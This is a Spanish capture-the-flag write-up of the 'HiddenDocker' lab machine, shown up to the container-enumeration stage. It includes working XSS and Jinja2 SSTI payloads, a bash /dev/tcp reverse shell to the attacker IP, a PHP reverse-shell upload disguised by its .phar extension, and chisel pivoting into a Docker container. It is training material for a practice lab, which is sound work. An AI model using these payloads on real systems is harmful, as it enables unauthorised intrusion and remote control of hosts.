---
title: "HiddenDocker - TheHackerLabs"
date: 2025-06-21
draft: false
slug: "THL-writeup-hiddenDocker"
excerpt: "Esta fue una máquina algo complicada. Después de analizar la página web del puerto 5000, que utiliza Werkzeug y Flask, descubrimos que es vulnerable a XSS y a Server Side Template Injection (SSTI), siendo así que logramos ganar acceso a la máquina víctima. Enumerando la máquina, descubrimos que hay un contenedor de Docker que tiene una página web activa en el puerto 80, así que aplicamos Reverse Port Forwarding para poder ver y analizar esa página. Luego de aplicarle Fuzzing, descubrimos una página que nos permite subir archivos. Aplicamos un Sniper Attack con la herramienta Intruder de BurpSuite para descubrir qué extensiones de archivos puede aceptar, logrando descubrir una extensión que nos permite subir una Reverse Shell con la que ganamos acceso al contenedor de Docker. Dentro del contenedor, descubrimos un mensaje que nos da una pista sobre dónde encontrar la contraseña del usuario Root. Además, descubrimos que nuestro usuario tiene privilegios para usar los comandos cut y grep como Root, por lo que usamos la guía de GTFOBins para aprovecharnos de estos comandos y ver la contraseña del usuario Root, con la que ganamos acceso a la máquina víctima vía SSH como Root."
categories: ["TheHackerLabs", "Medium Machine"]
tags: ["Linux", "Werkzeug", "Flask", "Cross-Site Scripting (XSS)", "Server Side Template Injection (SSTI)", "Docker", "Port Forwarding", "Reverse Port Forwarding", "Reverse Tunneling SOCKS Proxy", "Web Enumeration", "Fuzzing", "BurpSuite", "Sniper Attack", "Docker Container Enumeration", "Abusing Sudoers Privilege", "Privesc - Abusing Sudoers Privilege", "OSCP Style"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "Javascript"
  - "PHP"
  - "nc"
  - "cat"
  - "ip"
  - "ping"
  - "bash"
  - "chisel"
  - "python3"
  - "wget"
  - "tail"
  - "proxychains"
  - "ffuf"
  - "BurpSuite"
  - "hostname"
  - "sudo"
  - "cut"
  - "grep"
  - "ssh"
links:
  - "https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/"
  - "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2"
  - "https://catonmat.net/tcp-port-scanner-in-bash"
  - "https://github.com/jpillora/chisel"
  - "https://github.com/pentestmonkey/php-reverse-shell"
  - "https://gtfobins.github.io/gtfobins/cut/"
  - "https://gtfobins.github.io/gtfobins/grep/"
showtoc: true
header:
  teaser: "/assets/images/THL-writeup-hiddenDocker/hiddenDocker.jpg"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.10.130
PING 192.168.10.130 (192.168.10.130) 56(84) bytes of data.
64 bytes from 192.168.10.130: icmp_seq=1 ttl=64 time=5.27 ms
64 bytes from 192.168.10.130: icmp_seq=2 ttl=64 time=0.949 ms
64 bytes from 192.168.10.130: icmp_seq=3 ttl=64 time=0.797 ms
64 bytes from 192.168.10.130: icmp_seq=4 ttl=64 time=0.663 ms

--- 192.168.10.130 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3265ms
rtt min/avg/max/mdev = 0.663/1.920/5.274/1.938 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.10.130 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 12:28 CST
Initiating ARP Ping Scan at 12:28
Scanning 192.168.10.130 [1 port]
Completed ARP Ping Scan at 12:28, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 12:28
Scanning 192.168.10.130 [65535 ports]
Discovered open port 22/tcp on 192.168.10.130
Discovered open port 5000/tcp on 192.168.10.130
Completed SYN Stealth Scan at 12:28, 11.26s elapsed (65535 total ports)
Nmap scan report for 192.168.10.130
Host is up, received arp-response (0.0014s latency).
Scanned at 2025-06-20 12:28:28 CST for 11s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
5000/tcp open  upnp    syn-ack ttl 64
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Hay dos puertos abiertos y me da curiosidad saber qué servicios ejecuta el **puerto 5000**.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,5000 192.168.10.130 -oN targeted
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 12:29 CST
Nmap scan report for 192.168.10.130
Host is up (0.00089s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)

| ssh-hostkey: 
|   256 50:80:8f:01:a0:d4:76:f4:08:95:df:a1:45:39:71:93 (ECDSA)
|_  256 e8:af:26:05:75:f8:3e:d0:bf:d7:42:a1:42:48:fc:e6 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.2.2 (Python 3.11.2)

|_http-title: Flask Lab
|_http-server-header: Werkzeug/2.2.2 Python/3.11.2
MAC Address: XX (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Muy bien, podemos ver que hay una página web en el **puerto 5000** y que está ocupando **Werkzeug** y, al parecer, también **Flask**.

Ya conocemos una vulnerabilidad común que ocurre cuando se ocupan estos dos.

Pero primero, vamos a analizar esa página web.

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Página Web de Puerto 5000 {#Puerto5k}

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura1.png">
</p>

Parece ser un formulario de registro.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura2.png">
</p>

No veo algo que nos ayude.

Revisemos el código fuente para ver cómo funciona el formulario:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura3.png">
</p>

Por lo que entiendo, el formulario manda por una **petición POST** los campos del formulario que introduzcamos y, una vez enviados, nos redirige a la página `/greet`.

Pero parece que el campo del email no podremos modificarlo:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura4.png">
</p>

Todo esto lo podemos comprobar si capturamos el envío de la petición con **BurpSuite**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura5.png">
</p>

Ahí podemos ver la data cómo se está enviando.

Y cuando se envía, nos manda a la página `/greet`:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura6.png">
</p>

Algo que noté en el código fuente, es que parece que todos los campos, a excepción del campo email, aceptan cualquier texto, pues parece que no se está aplicando alguna sanitización. Además, el campo **name**, es el único que se refleja en la página `/greet`.

Esto nos da una idea de lo que podemos probar primero.

## Explotación de Vulnerabilidades {#Explotacion}

### Identificando Campos Vulnerables a XSS {#XSS}

Para el caso de los formularios, podemos probar cuál de estos es vulnerable a **XSS**.

La idea es, probar varios **payloads XSS** que tengan como objetivo cargar un archivo de un servidor que tenga el nombre del campo que estamos probando.

El servidor será nuestro y no importa que dicho archivo exista, pues es simplemente para identificar el campo vulnerable.

Algunos ejemplos pueden ser:
```bash
<script src=http://Tu_IP/nombre_campo></script>

'><script src=http://Tu_IP/nombre_campo></script>

"><script src=http://Tu_IP/nombre_campo></script>
```

Utilizaremos el primero y usaremos un servidor de **PHP**, para ver mejor la petición, aunque también se puede con un servidor de **Python**.

Inicia el servidor de **PHP**:
```bash
php -S 0.0.0.0:80
[Fri Jun 20 14:10:27 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
```

Ahora, vamos a probar desde la página el payload de **XSS**. 

Recuerda escribir el nombre del campo al que se dirigirá el payload, para identificar qué campo es vulnerable:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura7.png">
</p>

Al enviarlo, vemos que un campo sí es vulnerable:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura8.png">
</p>

Y si revisamos el servidor de **PHP**, veremos cuál es:
```bash
php -S 0.0.0.0:80
[Fri Jun 20 13:45:47 2025] PHP 8.4.6 Development Server (http://0.0.0.0:80) started
[Fri Jun 20 13:46:18 2025] Tu_IP:47018 Accepted
[Fri Jun 20 13:46:18 2025] Tu_IP:47018 [404]: GET /name - No such file or directory
[Fri Jun 20 13:46:18 2025] Tu_IP:47018 Closing
```
En efecto, el campo **name** es vulnerable a **XSS**.

Esto también lo podemos probar desde **BurpSuite**, modificando la data para incluir el payload de **XSS**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura9.png">
</p>

De paso probamos el campo del email, pero está claro que ese no será vulnerable, pues ya está llenado por defecto y no se puede modificar. Además, vemos el servidor **Werkzeug** referenciado en la respuesta de la petición.

Con esto comprobamos que:
* No hay una sanitización en ningún campo, siendo el campo **name** vulnerable a **XSS**.
* El campo **name**, es el único que se representa en la página `/greet`, después de que se envía la data.
* El uso del servidor **Werkzeug** y de que **Flask** también puede estar en uso, significa que puede ser vulnerable a **Server Side Template Injection** a través del campo **name**.

Vamos a comprobarlo.

### Aplicando Server Side Template Injection (SSTI) y Ganando Acceso a la Máquina {#SSTI}

Tenemos cómo referencia el siguiente blog y repositorio que nos explican como aplicar el **SSTI**:
* <a href="https://exploit-notes.hdks.org/exploit/web/framework/python/flask-jinja2-pentesting/" target="_blank">Flask Jinja2 Pentesting</a>
* <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">PayloadAllTheThings: Jinja2</a>

Veamos si reproduce la siguiente multiplicación:

{% raw %}
```bash
{{ 10*50 }}
```
{% endraw %}

Recuerda probarla en el campo **name**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura10.png">
</p>

Funcionó.

Entonces, vamos a probar si ejecuta el comando **id** con el siguiente payload:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
{% endraw %}

Probémoslo:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura11.png">
</p>

Excelente, si lo está ejecutando.

Directamente, utilicemos una **Reverse Shell** de **Bash**.

Inicia un listener con **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
```

Ahora, ejecutamos la **Reverse Shell** con el siguiente payload:

{% raw %}
```bash
{{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/Tu_IP/443 0>%261'").read() }}
```
{% endraw %}

Una vez que la ejecutes en la página web, observa la **netcat**:
```bash
nc -nvlp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.130] 49248
bash: no se puede establecer el grupo de proceso de terminal (334): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
pepinodemar@hiddendocker:~$ whoami
whoami
pepinodemar
```
Estamos dentro y nos encontramos en el directorio del **usuario pepinodemar**.

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Continuemos.

## Post Explotación {#Post}

### Enumeración de la Máquina {#linEnum}

Veamos qué archivos tiene este usuario:
```bash
pepinodemar@hiddendocker:~$ ls -la
total 32
drwx------ 4 pepinodemar pepinodemar 4096 may 23  2024 .
drwxr-xr-x 4 root        root        4096 may 22  2024 ..
lrwxrwxrwx 1 root        root           9 may 23  2024 .bash_history -> /dev/null
-rw-r--r-- 1 pepinodemar pepinodemar  220 may 22  2024 .bash_logout
-rw-r--r-- 1 pepinodemar pepinodemar 3526 may 22  2024 .bashrc
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 23  2024 Desktop
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 22  2024 .local
-rw-r--r-- 1 pepinodemar pepinodemar  807 may 22  2024 .profile
-rw-r--r-- 1 pepinodemar pepinodemar   24 may 22  2024 user.txt
```
Vemos la flag del usuario.

Leámosla:
```bash
pepinodemar@hiddendocker:~$ cat user.txt
...
```

Si revisamos el directorio **Desktop**, ahí encontraremos el directorio de **Flask**:
```bash
pepinodemar@hiddendocker:~$ ls -la Desktop/flaskapp/
total 16
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 22  2024 .
drwxr-xr-x 3 pepinodemar pepinodemar 4096 may 23  2024 ..
-rw-r--r-- 1 pepinodemar pepinodemar  472 may 22  2024 app.py
drwxr-xr-x 2 pepinodemar pepinodemar 4096 may 22  2024 templates
```

Y si revisamos ese script de **Python**, veremos que fue diseñado para ser vulnerable a **SSTI**:
```bash
pepinodemar@hiddendocker:~$ cat Desktop/flaskapp/app.py 
from flask import Flask, request, render_template_string, render_template

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/greet', methods=['POST'])
def greet():
    name = request.form['name']
    # Render the template with the user input directly (vulnerable a SSTI)
    template = f"Hello {name}!"
    return render_template_string(template)

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
```

Observa que la vulnerabilidad ocurre en la función `greet()`, esto porque: 
* La variable **name** obtiene directamente el contenido que el usuario envía a través del formulario.
* La variable **template** obtiene ese dato sin aplicar alguna sanitización.
* Después, renderiza ese contenido en una plantilla **Jinja2** usando **render_template_string** de forma dinámica, lo que provoca el **SSTI** si no fue sanitizado el dato usado.

Bastante simple, pero interesante el cómo funciona esta vulnerabilidad.

De ahí en fuera, no encontraremos algo más.

Si revisamos qué interfaces existen, veremos que está **docker** instalado:
```bash
pepinodemar@hiddendocker:~$ ip a
...
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether nm:8f:0a:8q:c9:76 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:7cff:fe8c:298b/64 scope link 
       valid_lft forever preferred_lft forever
...
```
Normalmente, cuando se crea un contenedor y es el primero en crearse, se le asigna la IP `172.17.0.2` (a menos que se especifique una IP).

Comprobémoslo con **ping**:
```bash
pepinodemar@hiddendocker:~$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.035 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1007ms
rtt min/avg/max/mdev = 0.035/0.042/0.050/0.007 ms
```

Bien, aun así, podemos aplicar un **ping sweep** con el siguiente one-liner de **Bash**:
```bash
pepinodemar@hiddendocker:~$ for i in $(seq 254); do ping 172.17.0.$i -c1 -W1 & done | grep from
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from 172.17.0.1: icmp_seq=1 ttl=64 time=0.031 ms
```
Excelente, tenemos identificado el contenedor.

Ahora, utiliza el siguiente one-liner de **Bash** que identifica los puertos abiertos:
```bash
pepinodemar@hiddendocker:~$ for port in {1..65535}; do echo > /dev/tcp/172.17.0.2/$port && echo "Port: $port open"; done 2>/dev/null
Port: 80 open
```
Tiene el **puerto 80** abierto, lo que significa que hay una página web activa.

Podríamos comprobarlo con **curl**, pero la máquina no lo tiene.

### Aplicando Port Forwarding y Tunneling para Ver Página/Contenedor de Docker {#contenedor}

Entonces, tenemos dos opciones:
* Aplicar **Port Forwarding** para poder ver la página del contenedor.
* Aplicar **Tunneling** para poder ver alcanzar al contenedor y utilizar distintas herramientas sobre este.

Apliquemos ambas.

Necesitaremos la herramienta **chisel** que puedes descargar aquí:
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>

Una vez que la descargues, continúa.

#### Aplicando Reverse Port Forwarding para Ver Página Web de Contenedor Docker {#portForwarding}

Primero, vamos a ejecutar **chisel** en nuestra máquina como servidor y eligiendo un puerto para el **Port Forwarding**:
```bash
./chisel server --reverse -p 1234
2025/06/21 13:42:21 server: Reverse tunnelling enabled
2025/06/21 13:42:21 server: Fingerprint bwWRGzJE....
2025/06/21 13:42:21 server: Listening on http://0.0.0.0:1234
```

Abre un servidor con **Python**: 
```bash
python3 -m http.server 80
```

Descarga **chisel** en la máquina víctima:
```bash
pepinodemar@hiddendocker:~$ wget http://Tu_IP/chisel
```

En la máquina víctima, vamos a ejecutar **chisel** como cliente para que se conecte al servidor de **chisel** de nuestra máquina:
```bash
./chisel client Tu_IP:1234 R:Puerto_kali_a_Usar:172.17.0.2:80
2025/06/21 21:50:33 client: Connecting to ws://Tu_IP:1234
2025/06/21 21:50:33 client: Connected (Latency 1.457318ms)
```
Le indicamos nuestra IP y el puerto usado en el servidor (`client Tu_IP:1234`), después aplicamos el **Reverse Port Forwarding** (`R:`) para que utilice un puerto de nuestra máquina, que servirá para mostrar la página web del contenedor (`Puerto_kali_a_Usar:172.17.0.2:80`).

Con esto listo, visitemos el **localhost** con el puerto que utilizaste. 

En mi caso, usé el **puerto 3000** de mi máquina para aplicar el **Reverse Port Forwarding** y poder mostrar la página web:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura12.png">
</p>

Excelente, ha funcionado correctamente.

Puedes utilizar cualquier herramienta dirigiéndola a `localhost_o_127.0.0.1:puerto_usado`, por ejemplo, usemos **nmap**:
```bash
nmap -sCV -p 3000 127.0.0.1
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 14:01 CST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000049s latency).

PORT     STATE SERVICE VERSION
3000/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

|_http-title: Dockerlabs
|_http-server-header: Apache/2.4.58 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.71 seconds
```
Funciona bien.

#### Aplicando Reverse Tunneling con SOCKS Proxy para Alcanzar Contenedor de Docker {#Tunneling}

Primero, vamos a ejecutar **chisel** en nuestra máquina como servidor y eligiendo un puerto para el **Tunneling**:
```bash
./chisel server --reverse -p 1234
2025/06/21 13:42:21 server: Reverse tunnelling enabled
2025/06/21 13:42:21 server: Fingerprint bwWRGzJE....
2025/06/21 13:42:21 server: Listening on http://0.0.0.0:1234
```

Abre un servidor con **Python**:
```bash
python3 -m http.server 80
```

Descarga **chisel** en la máquina víctima:
```bash
pepinodemar@hiddendocker:~$ wget http://Tu_IP/chisel
```

Digamos que por X o Y motivo, no sabes qué puertos tiene activo el contenedor/máquina; en ese caso, vamos a aplicar **Tunneling con SOCKS Proxy**.

Para esto, debemos revisar qué versión de **SOCKS** tenemos instalada, que lo comprobamos si tenemos el archivo `/etc/proxychains.conf` o `/etc/proxychains4.conf`:
```bash
locate proxychains
/etc/proxychains4.conf
```
En mi caso, tengo el archivo `/etc/proxychains4.conf`.

Ahí mismo, veremos qué versión de **SOCKS** tenemos, pues se ve al final del archivo:
```bash
cat /etc/proxychains4.conf | tail -n 4
# defaults set to "tor"
socks4 	127.0.0.1 9050
```
Vemos que tengo el **SOCKS4**.

Modifiquémoslo cambiando **socks4** por **socks5** y cambiamos el puerto a **1080**:
```bash
cat /etc/proxychains4.conf | tail -n 4
# defaults set to "tor"
#socks4  127.0.0.1 9050
socks5	 127.0.0.1 1080
```
Esto lo hacemos porque **chisel** funciona con esa versión de **SOCKS** y ese puerto.

Con esto listo, utilizamos **chisel** como cliente en la máquina víctima para conectarse a nuestro servidor de **chisel**:
```bash
pepinodemar@hiddendocker:~$ ./chisel client Tu_IP:1234 R:socks
2025/06/21 22:30:08 client: Connecting to ws://Tu_IP:1234
2025/06/21 22:30:08 client: Connected (Latency 1.293463ms)
```
Lo único que cambia, es que indicamos que se utilizará **SOCKS**.

Comprobemos que sirvió con la herramienta **proxychains** y **nmap**:
```bash
proxychains nmap -sT -Pn -n -p1-100 172.17.0.2 2>/dev/null
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-21 14:48 CST
Nmap scan report for 172.17.0.2
Host is up (0.011s latency).
Not shown: 99 closed tcp ports (conn-refused)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 1.58 seconds
```
Ya descubrimos que hay una página web en el **puerto 80**.

Si queremos verla, podemos registrar el **SOCKS5 Proxy** en la extensión **FoxyProxy**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura13.png">
</p>

Lo guardamos y lo activamos para poder ver la página web:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura14.png">
</p>

Excelente, aunque a mi parecer, si ya descubrimos el puerto usado en el contenedor, lo mejor sería aplicar **Reverse Port Forwarding**.

### Analizando Página Web del Contenedor Docker {#PaginaDocker}

Decidí aplicar el **Reverse Port Forwarding** para poder ver la página web del contenedor, esto por más comodidad y para que podamos ocupar nuestras herramientas sin problemas por el uso de proxies.

Entremos:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura12.png">
</p>

Parece ser la página de **Dockerlabs** del maestro **Pingüino de Mario** (un crack).

Pero no hay ninguna funcionalidad que podamos analizar ni en su código fuente.

Así que vamos a aplicar **Fuzzing** para ver que nos encontramos.

Utilizaremos **ffuf**:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://localhost:3000/FUZZ -t 300 -e .php,.txt,.html

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost:3000/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

uploads                 [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 41ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 126ms]
index.php               [Status: 200, Size: 8235, Words: 3246, Lines: 142, Duration: 5743ms]
machine.php             [Status: 200, Size: 1361, Words: 497, Lines: 54, Duration: 139ms]
.html                   [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 152ms]
                        [Status: 200, Size: 8235, Words: 3246, Lines: 142, Duration: 9927ms]
.php                    [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 9961ms]
server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 162ms]
:: Progress: [882180/882180] :: Job [1/1] :: 220 req/sec :: Duration: [0:24:25] :: Errors: 3699 ::
```

| Parámetros | Descripción |
|---|---|
| *-w*       | Para indicar el diccionario a usar en el fuzzing. |
| *-u*       | Para indicar la URL a utilizar. |
| *-t*       | Para indicar la cantidad de hilos a usar. |

Tenemos 2 páginas y un directorio, pero si revisamos la página **upload.php** no veremos nada; en cambio, la página **machine.php** nos muestra esto:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura15.png">
</p>

Nos deja subir archivos, pero no sabemos qué tipo de archivos y el código fuente no lo dice.

Intentemos subir una **Reverse Shell** de **PHP** como la de **pentestmonkey**, que puedes descargar de aquí:
* <a href="https://github.com/pentestmonkey/php-reverse-shell" target="_blank">Repositorio de pentestmonkey: php-reverse-shell</a>

Recuerda modificarla para agregar tu IP y el puerto que quieras usar:
```php
set_time_limit (0);
$VERSION = "1.0";
$ip = 'Tu_IP';  // CHANGE THIS
$port = 1337;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/bash -i';
```

Si la intentamos subir, nos dará el siguiente mensaje:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura16.png">
</p>

Solamente acepta **archivos ZIP** o eso sabemos por ahora.

Necesitamos saber si acepta otras extensiones, para cambiar la extensión de nuestra **Reverse Shell** y sea aceptada.

### Aplicando Sniper Attack para Encontrar Extensiones Aceptadas por Página Web y Ganando Acceso al Contenedor de Docker {#intruder}

Primero, vamos a capturar la petición de la subida de archivos y la enviaremos al **Intruder**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura17.png">
</p>

Observa que ya configuramos el campo a probar, eligiendo la extensión del archivo subido y dándole al botón **Add**. 

Cargamos el wordlist que ocuparemos de **seclists**, que lo puedes encontrar en `/seclists/Discovery/Web-Content/web-extensions.txt` y quitamos la opción que URL Encodea cada petición.

Ejecutamos el ataque y observa que hay una extensión que sí fue aceptada:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura18.png">
</p>

Supongamos que cada archivo se carga en el directorio `/uploads` que descubrimos en el **Fuzzing**:

<p align="center">
<img src="/assets/images/THL-writeup-hiddenDocker/Captura19.png">
</p>

Ahí está.

Como ya la subimos, solo necesitas abrir un listener con **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
```
Y dale clic al archivo subido para que se ejecute.

Observa la **netcat**:
```bash
nc -nvlp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [192.168.10.130] 43956
Linux a34889d3b818 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 x86_64 x86_64 GNU/Linux
 01:03:01 up 12:06,  0 user,  load average: 0.10, 0.07, 0.04
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (24): Inappropriate ioctl for device
bash: no job control in this shell
www-data@a34889d3b818:/$
```

Listo, estamos dentro del contenedor:
```bash
www-data@a34889d3b818:/$ hostname -I
hostname -I
172.17.0.2
```

Recuerda obtener una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm
export SHELL=bash
stty rows 51 columns 189
```
Continuemos.

### Enumeración de Contenedor y Ganando Acceso como Root a la Máquina Víctima Vía SSH {#enumDock}

Observa que el script de la página **upload.php**:
```bash
www-data@a34889d3b818:/$ cat /var/www/html/upload.php 
<?php
$targetDir = "uploads/";

if(isset($_POST["submit"])) {
    $fileName = basename($_FILES["file"]["name"]);
    $targetFilePath = $targetDir . $fileName;
    $fileType = pathinfo($targetFilePath,PATHINFO_EXTENSION);

    if($fileType != "zip" && $fileType != "phar") {
        echo "No se permite la subida de archivos que no sean .zip";
    } else {
        if(move_uploaded_file($_FILES["file"]["tmp_name"], $targetFilePath)){
            echo "El archivo ". $fileName. " ha sido subido correctamente.";
        } else {
            echo "Ha ocurrido un error al subir el archivo.";
        }
    }
}
?>
```
Vemos que en la **condición if** acepta archivos con extensión **zip o phar**.

Al revisar el `/etc/passwd`, vemos que hay 2 usuarios, además del **Root**:
```bash
www-data@a34889d3b818:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
dbadmin:x:1001:1001::/home/dbadmin:/bin/bash
```

Pero no podremos ver el contenido de sus directorios:
```bash
www-data@a34889d3b818:/$ ls -la /home
total 16
drwxr-xr-x 1 root    root    4096 May 17  2024 .
drwxr-xr-x 1 root    root    4096 Jun 20 20:24 ..
drwxr-x--- 2 dbadmin dbadmin 4096 May 17  2024 dbadmin
drwxr-x--- 2 ubuntu  ubuntu  4096 Apr 29  2024 ubuntu
```

Investigando un poco más, encontraremos un archivo de texto interesante en el directorio `/opt`:
```bash
www-data@a34889d3b818:/$ ls -la /opt 
total 12
drwxr-xr-x 1 root root 4096 May 17  2024 .
drwxr-xr-x 1 root root 4096 Jun 20 20:24 ..
-rw-r--r-- 1 root root  129 May 17  2024 nota.txt
```

Vamos a leerlo:
```bash
www-data@a34889d3b818:/$ cat /opt/nota.txt 
Protege la clave de root, se encuentra en su directorio /root/clave.txt, menos mal que nadie tiene permisos para acceder a ella.
```

